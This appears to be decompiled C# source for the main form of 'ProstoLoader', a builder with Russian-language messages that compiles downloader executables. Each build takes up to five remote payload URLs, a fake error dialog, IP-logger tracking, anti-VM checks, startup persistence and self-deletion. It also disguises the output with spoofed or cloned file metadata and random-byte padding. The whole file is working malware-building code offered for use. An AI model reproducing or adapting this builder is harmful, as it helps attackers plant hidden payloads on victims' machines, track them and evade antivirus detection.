using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.CSharp;
using ProstoLoader.Properties;

// Token: 0x02000028 RID: 40
public partial class Form1 : Form
{
	// Token: 0x060003DD RID: 989 RVA: 0x0000AD00 File Offset: 0x00008F00
	public Form1()
	{
		this.InitializeComponent();
		Form1.smethod_2(this.pictureBox1, false);
		Form1.smethod_2(this.pictureBox2, false);
		Form1.smethod_2(this.pictureBox3, false);
		Form1.smethod_2(this.pictureBox4, false);
		Form1.smethod_3(this.flatComboBox1, "None");
		Form1.smethod_3(this.flatComboBox2, "Temp");
		this.flatCheckBox3.Boolean_0 = false;
		Form1.smethod_4(this.flatButton2, false);
		Form1.smethod_4(this.flatTextBox1, false);
		Form1.smethod_3(this.TitleName, Form1.smethod_1());
		Form1.smethod_3(this.DescriptionText, Form1.smethod_1());
		Form1.smethod_3(this.CompanyText, Form1.smethod_1());
		Form1.smethod_3(this.CopyrightText, Form1.smethod_1());
		Form1.smethod_3(this.VersionText, Form1.smethod_6("{0}.{1}.{2}.{3}", new object[]
		{
			Form1.smethod_5(Form1.random_0, 0, 9),
			Form1.smethod_5(Form1.random_0, 0, 9),
			Form1.smethod_5(Form1.random_0, 0, 9),
			Form1.smethod_5(Form1.random_0, 0, 9)
		}));
		Form1.smethod_3(this.Guid_Value, Guid.NewGuid().ToString());
		Form1.smethod_7(this.richTextBox1, true);
	}

	// Token: 0x060003DE RID: 990 RVA: 0x0000AE68 File Offset: 0x00009068
	public static bool smethod_0(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5 = null)
	{
		CompilerParameters compilerParameters = Form1.smethod_8();
		Form1.smethod_9(compilerParameters, true);
		Form1.smethod_10(compilerParameters, string_1);
		CompilerParameters compilerParameters_ = compilerParameters;
		StringBuilder stringBuilder = Form1.smethod_11();
		if (!Form1.smethod_12(string_4))
		{
			Form1.smethod_13(stringBuilder, " /define:{0} ", string_4);
		}
		string string_6 = "/optimize+ /platform:x86 /target:winexe /unsafe";
		if (string_5 != null)
		{
			string_6 = Form1.smethod_14(string_6, " /win32icon:\"", string_5, "\"");
		}
		string_6 = Form1.smethod_16(string_6, Form1.smethod_15(stringBuilder));
		Form1.smethod_17(compilerParameters_, string_6);
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.dll");
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.Windows.Forms.dll");
		Form1.smethod_19(Form1.smethod_18(compilerParameters_), "System.Management.dll");
		if (string_3 != null)
		{
			Form1.smethod_19(Form1.smethod_20(compilerParameters_), string_3);
		}
		CompilerResults compilerResults_ = Form1.smethod_22(Form1.smethod_21(new Dictionary<string, string>
		{
			{
				"CompilerVersion",
				string_2
			}
		}), compilerParameters_, new string[]
		{
			string_0
		});
		if (Form1.smethod_24(Form1.smethod_23(compilerResults_)) > 0)
		{
			Form1.smethod_26(Form1.smethod_25("Имеются {0} ошибок", Form1.smethod_24(Form1.smethod_23(compilerResults_))), "Ошибка компиляции", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			IEnumerator enumerator = Form1.smethod_27(Form1.smethod_23(compilerResults_));
			try
			{
				while (Form1.smethod_32(enumerator))
				{
					CompilerError compilerError = (CompilerError)Form1.smethod_28(enumerator);
					Form1.smethod_31("Error_Compiler.txt", Form1.smethod_30("Ошибка: {0} \r\nСтрока: {1}\r\n", Form1.smethod_15(compilerError), Form1.smethod_29(compilerError)));
				}
			}
			finally
			{
				IDisposable disposable = enumerator as IDisposable;
				if (disposable != null)
				{
					Form1.smethod_33(disposable);
				}
			}
			return false;
		}
		return true;
	}

	// Token: 0x060003DF RID: 991 RVA: 0x0000AFF4 File Offset: 0x000091F4
	public string method_0()
	{
		string string_ = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
		string text = "";
		Random random_ = Form1.smethod_34();
		int num = Form1.smethod_5(random_, 5, Form1.smethod_35(string_));
		for (int i = 0; i < num; i++)
		{
			text += Form1.smethod_36(string_, Form1.smethod_5(random_, 0, Form1.smethod_35(string_))).ToString();
		}
		return text;
	}

	// Token: 0x060003E0 RID: 992 RVA: 0x0000B058 File Offset: 0x00009258
	private void flatButton2_Click(object sender, EventArgs e)
	{
		bool flag = false;
		if (Form1.smethod_38(Form1.smethod_37(this.flatComboBox2), ""))
		{
			flag = true;
			Form1.smethod_26("Не указан путь для скачивания файла!", "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		if (Form1.smethod_38(Form1.smethod_37(this.tFName1), ""))
		{
			flag = true;
			Form1.smethod_26("Не указана ссылка на файл или имя файла", "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		if (Form1.smethod_38(Form1.smethod_37(this.TitleName), "") || Form1.smethod_38(Form1.smethod_37(this.DescriptionText), "") || Form1.smethod_38(Form1.smethod_37(this.CompanyText), "") || Form1.smethod_38(Form1.smethod_37(this.VersionText), "") || Form1.smethod_38(Form1.smethod_37(this.Guid_Value), "") || Form1.smethod_38(Form1.smethod_37(this.CopyrightText), ""))
		{
			flag = true;
			Form1.smethod_26("Заполните данные в Описание файла или сгенирируйте случайные значения.", " Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
		if (!flag)
		{
			using (SaveFileDialog saveFileDialog = Form1.smethod_39())
			{
				Form1.smethod_40(saveFileDialog, Form1.smethod_1());
				Form1.smethod_41(saveFileDialog, "Приложение (.exe)|*.exe");
				if (Form1.smethod_42(saveFileDialog, this) == DialogResult.OK)
				{
					string text = Class2.String_1;
					text = Form1.smethod_45(text, "[NameFile]", Form1.smethod_44(Form1.smethod_43(saveFileDialog)));
					text = Form1.smethod_45(text, "[Title]", Form1.smethod_37(this.TitleName));
					text = Form1.smethod_45(text, "[Description]", Form1.smethod_37(this.DescriptionText));
					text = Form1.smethod_45(text, "[Company]", Form1.smethod_37(this.CompanyText));
					text = Form1.smethod_45(text, "[Product]", Form1.smethod_37(this.TitleName));
					text = Form1.smethod_45(text, "[Copyright]", Form1.smethod_37(this.CopyrightText));
					text = Form1.smethod_45(text, "[Guid]", Form1.smethod_37(this.Guid_Value));
					text = Form1.smethod_45(text, "[Version]", Form1.smethod_37(this.VersionText));
					text = Form1.smethod_45(text, "[U1]", Form1.smethod_37(this.tDown1));
					text = Form1.smethod_45(text, "[F1]", Form1.smethod_37(this.tFName1));
					text = Form1.smethod_45(text, "[U2]", Form1.smethod_37(this.tDown2));
					text = Form1.smethod_45(text, "[F2]", Form1.smethod_37(this.tFName2));
					text = Form1.smethod_45(text, "[U3]", Form1.smethod_37(this.tDown3));
					text = Form1.smethod_45(text, "[F3]", Form1.smethod_37(this.tFName3));
					text = Form1.smethod_45(text, "[U4]", Form1.smethod_37(this.tDown4));
					text = Form1.smethod_45(text, "[F4]", Form1.smethod_37(this.tFName4));
					text = Form1.smethod_45(text, "[U5]", Form1.smethod_37(this.tDown5));
					text = Form1.smethod_45(text, "[F5]", Form1.smethod_37(this.tFName5));
					text = text.Replace("[D1]", ((int)this.flatNumeric2.Int64_0 * 1000).ToString());
					text = text.Replace("[D2]", ((int)this.flatNumeric3.Int64_0 * 1000).ToString());
					text = text.Replace("[D3]", ((int)this.flatNumeric4.Int64_0 * 1000).ToString());
					text = text.Replace("[D4]", ((int)this.flatNumeric5.Int64_0 * 1000).ToString());
					text = text.Replace("[D5]", ((int)this.flatNumeric6.Int64_0 * 1000).ToString());
					text = text.Replace("[IP]", this.LinkLoggerTextBox.Text);
					text = text.Replace("[Fake]", this.flatComboBox1.Text);
					text = text.Replace("[Zagol]", this.flatTextBox1.Text);
					text = text.Replace("[TextFake]", this.richTextBox1.Text);
					text = text.Replace("[antivm]", this.flatCheckBox4.Boolean_0 ? "true" : "false");
					text = text.Replace("[StartUp]", this.flatCheckBox3.Boolean_0 ? "true" : "false");
					string text2 = this.flatComboBox2.Text;
					if (text2 != null)
					{
						if (text2 == "Текущая папка")
						{
							text = text.Replace("[Path]", "AppDomain.CurrentDomain.BaseDirectory");
						}
						else if (text2 == "Temp")
						{
							text = text.Replace("[Path]", "Environment.GetEnvironmentVariable( \"Temp\" )");
						}
						else if (!(text2 == "AppData"))
						{
							if (text2 == "ProgramFiles(x86)")
							{
								text = text.Replace("[Path]", "Environment.GetEnvironmentVariable(\"ProgramFiles\")");
							}
							else if (!(text2 == "User"))
							{
								if (text2 == "ProgramData")
								{
									text = text.Replace("[Path]", "Environment.GetEnvironmentVariable(\"ALLUSERPOFILE\")");
								}
							}
							else
							{
								text = text.Replace("[Path]", "Environment.GetEnvironmentVariable(\"USERPROFILE)");
							}
						}
						else
						{
							text = text.Replace("[Path]", "Environment.GetEnvironmentVariable( \"AppData\" )");
						}
					}
					text = text.Replace("[Delete]", this.flatCheckBox2.Boolean_0 ? "true" : "false");
					string text3 = "";
					if (this.flatComboBox1.Text != "None")
					{
						text3 += "FAKE;";
					}
					if (this.flatCheckBox4.Boolean_0)
					{
						text3 += "VM;";
					}
					if (this.flatCheckBox2.Boolean_0)
					{
						text3 += "DEL;";
					}
					if (this.LinkLoggerTextBox.Text != "")
					{
						text3 += "LOGGER;";
					}
					if (this.flatCheckBox3.Boolean_0)
					{
						text3 += "STARTUP;";
					}
					if ((int)this.flatNumeric2.Int64_0 > 1)
					{
						text3 += "D1;";
					}
					if ((int)this.flatNumeric3.Int64_0 > 1)
					{
						text3 += "D2;";
					}
					if ((int)this.flatNumeric4.Int64_0 > 1)
					{
						text3 += "D3;";
					}
					if ((int)this.flatNumeric5.Int64_0 > 1)
					{
						text3 += "D4;";
					}
					if ((int)this.flatNumeric6.Int64_0 > 1)
					{
						text3 += "D5;";
					}
					if (this.IconTextBox.Text != "")
					{
						this.bool_0 = Form1.smethod_0(text, saveFileDialog.FileName, "v4.0", null, text3, this.IconTextBox.Text);
					}
					else
					{
						this.bool_0 = Form1.smethod_0(text, saveFileDialog.FileName, "v4.0", null, text3, null);
					}
					Class0.smethod_0(saveFileDialog.FileName);
					if (this.flatNumeric1.Int64_0 > 0L)
					{
						this.method_1(saveFileDialog.FileName, (int)this.flatNumeric1.Int64_0, true);
					}
					if (this.bool_0)
					{
						MessageBox.Show("Компиляция прошла успешно! Файл сохранен по пути: " + saveFileDialog.FileName, " Успешно!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
			}
		}
	}

	// Token: 0x060003E1 RID: 993 RVA: 0x0000B79C File Offset: 0x0000999C
	private void ChoiceIco_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = Form1.smethod_46();
		try
		{
			Form1.smethod_47(openFileDialog, "Выберите иконку");
			Form1.smethod_41(openFileDialog, ".ico|*.ico");
			if (Form1.smethod_48(openFileDialog) == DialogResult.OK)
			{
				Form1.smethod_3(this.IconTextBox, Form1.smethod_43(openFileDialog));
				Form1.smethod_49(this.pictureBox8, Form1.smethod_43(openFileDialog));
			}
		}
		finally
		{
			if (openFileDialog != null)
			{
				Form1.smethod_33(openFileDialog);
			}
		}
	}

	// Token: 0x060003E2 RID: 994 RVA: 0x0000B80C File Offset: 0x00009A0C
	private void flatButton1_Click(object sender, EventArgs e)
	{
		Form1.smethod_3(this.TitleName, Form1.smethod_1());
		Form1.smethod_3(this.DescriptionText, Form1.smethod_1());
		Form1.smethod_3(this.CompanyText, Form1.smethod_1());
		Form1.smethod_3(this.CopyrightText, Form1.smethod_1());
		Form1.smethod_3(this.VersionText, Form1.smethod_6("{0}.{1}.{2}.{3}", new object[]
		{
			Form1.smethod_5(Form1.random_0, 0, 9),
			Form1.smethod_5(Form1.random_0, 0, 9),
			Form1.smethod_5(Form1.random_0, 0, 9),
			Form1.smethod_5(Form1.random_0, 0, 9)
		}));
		Form1.smethod_3(this.Guid_Value, Guid.NewGuid().ToString());
	}

	// Token: 0x060003E3 RID: 995 RVA: 0x00003786 File Offset: 0x00001986
	private static string smethod_1()
	{
		return Form1.smethod_45(Form1.smethod_50(), ".", "");
	}

	// Token: 0x060003E4 RID: 996 RVA: 0x0000B8E8 File Offset: 0x00009AE8
	public void method_1(string string_0, int int_0, bool bool_1)
	{
		int_0 *= 1024;
		FileStream stream_ = Form1.smethod_51(string_0, FileMode.Append, FileAccess.Write);
		byte[] byte_ = new byte[int_0];
		if (bool_1)
		{
			Form1.smethod_52(Form1.smethod_34(), byte_);
		}
		Form1.smethod_53(stream_, byte_, 0, int_0);
		Form1.smethod_54(stream_);
	}

	// Token: 0x060003E5 RID: 997 RVA: 0x0000B92C File Offset: 0x00009B2C
	private void flatComboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Form1.smethod_38(Form1.smethod_37(this.flatComboBox1), "Information"))
		{
			Form1.smethod_2(this.pictureBox1, true);
			Form1.smethod_2(this.pictureBox2, false);
			Form1.smethod_2(this.pictureBox3, false);
			Form1.smethod_2(this.pictureBox4, false);
			Form1.smethod_4(this.flatTextBox1, true);
			Form1.smethod_7(this.richTextBox1, false);
		}
		if (Form1.smethod_38(Form1.smethod_37(this.flatComboBox1), "Warning"))
		{
			Form1.smethod_2(this.pictureBox2, true);
			Form1.smethod_2(this.pictureBox1, false);
			Form1.smethod_2(this.pictureBox3, false);
			Form1.smethod_2(this.pictureBox4, false);
			Form1.smethod_4(this.flatTextBox1, true);
			Form1.smethod_7(this.richTextBox1, false);
		}
		if (Form1.smethod_38(Form1.smethod_37(this.flatComboBox1), "Question"))
		{
			Form1.smethod_2(this.pictureBox4, true);
			Form1.smethod_2(this.pictureBox2, false);
			Form1.smethod_2(this.pictureBox3, false);
			Form1.smethod_2(this.pictureBox1, false);
			Form1.smethod_4(this.flatTextBox1, true);
			Form1.smethod_7(this.richTextBox1, false);
		}
		if (Form1.smethod_38(Form1.smethod_37(this.flatComboBox1), "Error"))
		{
			Form1.smethod_2(this.pictureBox3, true);
			Form1.smethod_2(this.pictureBox2, false);
			Form1.smethod_2(this.pictureBox1, false);
			Form1.smethod_2(this.pictureBox4, false);
			Form1.smethod_4(this.flatTextBox1, true);
			Form1.smethod_7(this.richTextBox1, false);
		}
		if (Form1.smethod_38(Form1.smethod_37(this.flatComboBox1), "None"))
		{
			Form1.smethod_2(this.pictureBox3, false);
			Form1.smethod_2(this.pictureBox2, false);
			Form1.smethod_2(this.pictureBox1, false);
			Form1.smethod_2(this.pictureBox4, false);
			Form1.smethod_4(this.flatTextBox1, false);
			Form1.smethod_7(this.richTextBox1, true);
		}
	}

	// Token: 0x060003E6 RID: 998 RVA: 0x0000379C File Offset: 0x0000199C
	private void flatLabel3_Click(object sender, EventArgs e)
	{
		Form1.smethod_55("https://iplogger.ru/logger/");
	}

	// Token: 0x060003E7 RID: 999 RVA: 0x0000BB14 File Offset: 0x00009D14
	private void flatButton3_Click(object sender, EventArgs e)
	{
		Form1.smethod_3(this.tDown1, Settings.Default.D1);
		Form1.smethod_3(this.tDown2, Settings.Default.D2);
		Form1.smethod_3(this.tDown3, Settings.Default.D3);
		Form1.smethod_3(this.tDown4, Settings.Default.D4);
		Form1.smethod_3(this.tDown5, Settings.Default.D5);
		Form1.smethod_3(this.tFName1, Settings.Default.F1);
		Form1.smethod_3(this.tFName2, Settings.Default.F2);
		Form1.smethod_3(this.tFName3, Settings.Default.F3);
		Form1.smethod_3(this.tFName4, Settings.Default.F4);
		Form1.smethod_3(this.tFName5, Settings.Default.F5);
		Form1.smethod_3(this.IconTextBox, Settings.Default.Ico);
		Form1.smethod_3(this.LinkLoggerTextBox, Settings.Default.Ip);
		Form1.smethod_3(this.flatComboBox2, Settings.Default.Folder);
		Form1.smethod_3(this.flatTextBox1, Settings.Default.FakeZ);
		Form1.smethod_3(this.richTextBox1, Settings.Default.FakeT);
		Form1.smethod_3(this.flatComboBox1, Settings.Default.FakeI);
		this.flatCheckBox2.Boolean_0 = Settings.Default.Del;
		this.flatCheckBox3.Boolean_0 = Settings.Default.Run;
		Form1.smethod_3(this.TitleName, Settings.Default.As1);
		Form1.smethod_3(this.DescriptionText, Settings.Default.As2);
		Form1.smethod_3(this.CompanyText, Settings.Default.As3);
		Form1.smethod_3(this.VersionText, Settings.Default.As4);
		Form1.smethod_3(this.Guid_Value, Settings.Default.As5);
		Form1.smethod_3(this.CopyrightText, Settings.Default.As6);
		Form1.smethod_26("Настройки восстановлены!", " Успешно!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
	}

	// Token: 0x060003E8 RID: 1000 RVA: 0x0000BD2C File Offset: 0x00009F2C
	private void flatButton4_Click(object sender, EventArgs e)
	{
		Settings.Default.D1 = Form1.smethod_37(this.tDown1);
		Settings.Default.D2 = Form1.smethod_37(this.tDown2);
		Settings.Default.D3 = Form1.smethod_37(this.tDown3);
		Settings.Default.D4 = Form1.smethod_37(this.tDown4);
		Settings.Default.D5 = Form1.smethod_37(this.tDown5);
		Settings.Default.F1 = Form1.smethod_37(this.tFName1);
		Settings.Default.F2 = Form1.smethod_37(this.tFName2);
		Settings.Default.F3 = Form1.smethod_37(this.tFName3);
		Settings.Default.F4 = Form1.smethod_37(this.tFName4);
		Settings.Default.F5 = Form1.smethod_37(this.tFName5);
		Settings.Default.Ico = Form1.smethod_37(this.IconTextBox);
		Settings.Default.Ip = Form1.smethod_37(this.LinkLoggerTextBox);
		Settings.Default.Folder = Form1.smethod_37(this.flatComboBox2);
		Settings.Default.FakeI = Form1.smethod_37(this.flatComboBox1);
		Settings.Default.FakeT = Form1.smethod_37(this.richTextBox1);
		Settings.Default.FakeZ = Form1.smethod_37(this.flatTextBox1);
		Settings.Default.Del = this.flatCheckBox2.Boolean_0;
		Settings.Default.Run = this.flatCheckBox3.Boolean_0;
		Settings.Default.As1 = Form1.smethod_37(this.TitleName);
		Settings.Default.As2 = Form1.smethod_37(this.DescriptionText);
		Settings.Default.As3 = Form1.smethod_37(this.CompanyText);
		Settings.Default.As4 = Form1.smethod_37(this.VersionText);
		Settings.Default.As5 = Form1.smethod_37(this.Guid_Value);
		Settings.Default.As6 = Form1.smethod_37(this.CopyrightText);
		Form1.smethod_56(Settings.Default);
		Form1.smethod_26("Настройки сохранены!", " Успешно!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
	}

	// Token: 0x060003E9 RID: 1001 RVA: 0x000037A9 File Offset: 0x000019A9
	private void method_2(object sender, EventArgs e)
	{
		Form1.smethod_55("https://teleg.one/ProstoCoder");
	}

	// Token: 0x060003EA RID: 1002 RVA: 0x0000BF50 File Offset: 0x0000A150
	private void flatButton5_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = Form1.smethod_46();
		Form1.smethod_41(openFileDialog, "Любой файл|*.*");
		OpenFileDialog openFileDialog2 = openFileDialog;
		if (Form1.smethod_48(openFileDialog2) == DialogResult.OK)
		{
			FileVersionInfo fileVersionInfo = Form1.smethod_57(Form1.smethod_43(openFileDialog2));
			Form1.smethod_3(this.CompanyText, Form1.smethod_58(fileVersionInfo));
			Form1.smethod_3(this.TitleName, Form1.smethod_59(fileVersionInfo));
			Form1.smethod_3(this.DescriptionText, Form1.smethod_59(fileVersionInfo));
			Form1.smethod_3(this.CopyrightText, Form1.smethod_60(fileVersionInfo));
			Form1.smethod_3(this.Guid_Value, Guid.NewGuid().ToString());
			this.VersionText.Text = string.Concat(new string[]
			{
				Form1.smethod_61(fileVersionInfo).ToString(),
				".",
				fileVersionInfo.FileMinorPart.ToString(),
				".",
				fileVersionInfo.FileBuildPart.ToString(),
				".0"
			});
		}
	}

	// Token: 0x060003EB RID: 1003 RVA: 0x000037B6 File Offset: 0x000019B6
	private void method_3(object object_0)
	{
		if (this.flatCheckBox1.Boolean_0)
		{
			Form1.smethod_4(this.flatButton2, true);
			return;
		}
		Form1.smethod_4(this.flatButton2, false);
	}

	// Token: 0x060003EC RID: 1004 RVA: 0x000037DE File Offset: 0x000019DE
	private void flatClose1_Click(object sender, EventArgs e)
	{
		while (Form1.smethod_62(this) > 0.0)
		{
			Form1.smethod_63(this, Form1.smethod_62(this) - 0.01);
			Form1.smethod_64(10);
		}
	}

	// Token: 0x060003ED RID: 1005 RVA: 0x0000C04C File Offset: 0x0000A24C
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		for (;;)
		{
			IL_64:
			int num = (Form1.smethod_62(this) <= 0.0) ? 504844603 : 494752130;
			for (;;)
			{
				switch ((num ^ 1588435587) % 4)
				{
				case 1:
					Form1.smethod_63(this, Form1.smethod_62(this) - 0.01);
					Form1.smethod_64(10);
					num = 2077070053;
					continue;
				case 2:
					goto IL_64;
				case 3:
					num = 494752130;
					continue;
				}
				return;
			}
		}
	}

	// Token: 0x060003EE RID: 1006 RVA: 0x00003811 File Offset: 0x00001A11
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			Form1.smethod_33(this.icontainer_0);
		}
		base.Dispose(disposing);
	}

	// Token: 0x060003F1 RID: 1009 RVA: 0x0000383C File Offset: 0x00001A3C
	static void smethod_2(Control control_0, bool bool_1)
	{
		control_0.Visible = bool_1;
	}

	// Token: 0x060003F2 RID: 1010 RVA: 0x00002340 File Offset: 0x00000540
	static void smethod_3(Control control_0, string string_0)
	{
		control_0.Text = string_0;
	}

	// Token: 0x060003F3 RID: 1011 RVA: 0x00003845 File Offset: 0x00001A45
	static void smethod_4(Control control_0, bool bool_1)
	{
		control_0.Enabled = bool_1;
	}

	// Token: 0x060003F4 RID: 1012 RVA: 0x0000384E File Offset: 0x00001A4E
	static int smethod_5(Random random_1, int int_0, int int_1)
	{
		return random_1.Next(int_0, int_1);
	}

	// Token: 0x060003F5 RID: 1013 RVA: 0x00003858 File Offset: 0x00001A58
	static string smethod_6(string string_0, object[] object_0)
	{
		return string.Format(string_0, object_0);
	}

	// Token: 0x060003F6 RID: 1014 RVA: 0x0000333B File Offset: 0x0000153B
	static void smethod_7(TextBoxBase textBoxBase_0, bool bool_1)
	{
		textBoxBase_0.ReadOnly = bool_1;
	}

	// Token: 0x060003F7 RID: 1015 RVA: 0x00003861 File Offset: 0x00001A61
	static CompilerParameters smethod_8()
	{
		return new CompilerParameters();
	}

	// Token: 0x060003F8 RID: 1016 RVA: 0x00003868 File Offset: 0x00001A68
	static void smethod_9(CompilerParameters compilerParameters_0, bool bool_1)
	{
		compilerParameters_0.GenerateExecutable = bool_1;
	}

	// Token: 0x060003F9 RID: 1017 RVA: 0x00003871 File Offset: 0x00001A71
	static void smethod_10(CompilerParameters compilerParameters_0, string string_0)
	{
		compilerParameters_0.OutputAssembly = string_0;
	}

	// Token: 0x060003FA RID: 1018 RVA: 0x0000387A File Offset: 0x00001A7A
	static StringBuilder smethod_11()
	{
		return new StringBuilder();
	}

	// Token: 0x060003FB RID: 1019 RVA: 0x00003881 File Offset: 0x00001A81
	static bool smethod_12(string string_0)
	{
		return string.IsNullOrEmpty(string_0);
	}

	// Token: 0x060003FC RID: 1020 RVA: 0x00003889 File Offset: 0x00001A89
	static StringBuilder smethod_13(StringBuilder stringBuilder_0, string string_0, object object_0)
	{
		return stringBuilder_0.AppendFormat(string_0, object_0);
	}

	// Token: 0x060003FD RID: 1021 RVA: 0x00003893 File Offset: 0x00001A93
	static string smethod_14(string string_0, string string_1, string string_2, string string_3)
	{
		return string_0 + string_1 + string_2 + string_3;
	}

	// Token: 0x060003FE RID: 1022 RVA: 0x00002128 File Offset: 0x00000328
	static string smethod_15(object object_0)
	{
		return object_0.ToString();
	}

	// Token: 0x060003FF RID: 1023 RVA: 0x0000207A File Offset: 0x0000027A
	static string smethod_16(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	// Token: 0x06000400 RID: 1024 RVA: 0x0000389E File Offset: 0x00001A9E
	static void smethod_17(CompilerParameters compilerParameters_0, string string_0)
	{
		compilerParameters_0.CompilerOptions = string_0;
	}

	// Token: 0x06000401 RID: 1025 RVA: 0x000038A7 File Offset: 0x00001AA7
	static StringCollection smethod_18(CompilerParameters compilerParameters_0)
	{
		return compilerParameters_0.ReferencedAssemblies;
	}

	// Token: 0x06000402 RID: 1026 RVA: 0x000038AF File Offset: 0x00001AAF
	static int smethod_19(StringCollection stringCollection_0, string string_0)
	{
		return stringCollection_0.Add(string_0);
	}

	// Token: 0x06000403 RID: 1027 RVA: 0x000038B8 File Offset: 0x00001AB8
	static StringCollection smethod_20(CompilerParameters compilerParameters_0)
	{
		return compilerParameters_0.EmbeddedResources;
	}

	// Token: 0x06000404 RID: 1028 RVA: 0x000038C0 File Offset: 0x00001AC0
	static CSharpCodeProvider smethod_21(IDictionary<string, string> idictionary_0)
	{
		return new CSharpCodeProvider(idictionary_0);
	}

	// Token: 0x06000405 RID: 1029 RVA: 0x000038C8 File Offset: 0x00001AC8
	static CompilerResults smethod_22(CodeDomProvider codeDomProvider_0, CompilerParameters compilerParameters_0, string[] string_0)
	{
		return codeDomProvider_0.CompileAssemblyFromSource(compilerParameters_0, string_0);
	}

	// Token: 0x06000406 RID: 1030 RVA: 0x000038D2 File Offset: 0x00001AD2
	static CompilerErrorCollection smethod_23(CompilerResults compilerResults_0)
	{
		return compilerResults_0.Errors;
	}

	// Token: 0x06000407 RID: 1031 RVA: 0x000038DA File Offset: 0x00001ADA
	static int smethod_24(CollectionBase collectionBase_0)
	{
		return collectionBase_0.Count;
	}

	// Token: 0x06000408 RID: 1032 RVA: 0x000038E2 File Offset: 0x00001AE2
	static string smethod_25(string string_0, object object_0)
	{
		return string.Format(string_0, object_0);
	}

	// Token: 0x06000409 RID: 1033 RVA: 0x0000375B File Offset: 0x0000195B
	static DialogResult smethod_26(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	// Token: 0x0600040A RID: 1034 RVA: 0x000038EB File Offset: 0x00001AEB
	static IEnumerator smethod_27(CollectionBase collectionBase_0)
	{
		return collectionBase_0.GetEnumerator();
	}

	// Token: 0x0600040B RID: 1035 RVA: 0x00002FD1 File Offset: 0x000011D1
	static object smethod_28(IEnumerator ienumerator_0)
	{
		return ienumerator_0.Current;
	}

	// Token: 0x0600040C RID: 1036 RVA: 0x000038F3 File Offset: 0x00001AF3
	static int smethod_29(CompilerError compilerError_0)
	{
		return compilerError_0.Line;
	}

	// Token: 0x0600040D RID: 1037 RVA: 0x000038FB File Offset: 0x00001AFB
	static string smethod_30(string string_0, object object_0, object object_1)
	{
		return string.Format(string_0, object_0, object_1);
	}

	// Token: 0x0600040E RID: 1038 RVA: 0x0000213A File Offset: 0x0000033A
	static void smethod_31(string string_0, string string_1)
	{
		File.WriteAllText(string_0, string_1);
	}

	// Token: 0x0600040F RID: 1039 RVA: 0x00002FD9 File Offset: 0x000011D9
	static bool smethod_32(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	// Token: 0x06000410 RID: 1040 RVA: 0x00002FE1 File Offset: 0x000011E1
	static void smethod_33(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	// Token: 0x06000411 RID: 1041 RVA: 0x00003905 File Offset: 0x00001B05
	static Random smethod_34()
	{
		return new Random();
	}

	// Token: 0x06000412 RID: 1042 RVA: 0x0000390C File Offset: 0x00001B0C
	static int smethod_35(string string_0)
	{
		return string_0.Length;
	}

	// Token: 0x06000413 RID: 1043 RVA: 0x000020F5 File Offset: 0x000002F5
	static char smethod_36(string string_0, int int_0)
	{
		return string_0[int_0];
	}

	// Token: 0x06000414 RID: 1044 RVA: 0x00002476 File Offset: 0x00000676
	static string smethod_37(Control control_0)
	{
		return control_0.Text;
	}

	// Token: 0x06000415 RID: 1045 RVA: 0x00003742 File Offset: 0x00001942
	static bool smethod_38(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	// Token: 0x06000416 RID: 1046 RVA: 0x00003914 File Offset: 0x00001B14
	static SaveFileDialog smethod_39()
	{
		return new SaveFileDialog();
	}

	// Token: 0x06000417 RID: 1047 RVA: 0x0000391B File Offset: 0x00001B1B
	static void smethod_40(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.FileName = string_0;
	}

	// Token: 0x06000418 RID: 1048 RVA: 0x00003924 File Offset: 0x00001B24
	static void smethod_41(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.Filter = string_0;
	}

	// Token: 0x06000419 RID: 1049 RVA: 0x0000392D File Offset: 0x00001B2D
	static DialogResult smethod_42(CommonDialog commonDialog_0, IWin32Window iwin32Window_0)
	{
		return commonDialog_0.ShowDialog(iwin32Window_0);
	}

	// Token: 0x0600041A RID: 1050 RVA: 0x00003936 File Offset: 0x00001B36
	static string smethod_43(FileDialog fileDialog_0)
	{
		return fileDialog_0.FileName;
	}

	// Token: 0x0600041B RID: 1051 RVA: 0x0000393E File Offset: 0x00001B3E
	static string smethod_44(string string_0)
	{
		return Path.GetFileNameWithoutExtension(string_0);
	}

	// Token: 0x0600041C RID: 1052 RVA: 0x00002130 File Offset: 0x00000330
	static string smethod_45(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	// Token: 0x0600041D RID: 1053 RVA: 0x00003946 File Offset: 0x00001B46
	static OpenFileDialog smethod_46()
	{
		return new OpenFileDialog();
	}

	// Token: 0x0600041E RID: 1054 RVA: 0x0000394D File Offset: 0x00001B4D
	static void smethod_47(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.Title = string_0;
	}

	// Token: 0x0600041F RID: 1055 RVA: 0x00003956 File Offset: 0x00001B56
	static DialogResult smethod_48(CommonDialog commonDialog_0)
	{
		return commonDialog_0.ShowDialog();
	}

